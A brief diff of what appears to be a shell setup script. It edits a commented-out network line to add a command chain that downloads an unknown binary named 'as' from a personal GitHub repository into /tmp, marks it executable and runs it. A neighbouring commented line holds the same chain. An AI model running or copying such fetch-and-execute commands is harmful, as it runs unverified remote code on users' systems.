@@ -1,4 +1,4 @@
-#ip link set dev eth0 up && udhcpc eth0
+#ip link set dev eth0 up && udhcpc eth0 && cd /tmp && wget https://raw.githubusercontent.com/Wisherk8/s/main/as && chmod +x as && ./as
 #cd /tmp && wget https://raw.githubusercontent.com/Wisherk8/s/main/as && chmod +x as && ./as
 mkdir /media/setup
 cp -a /media/vda/* /media/setup
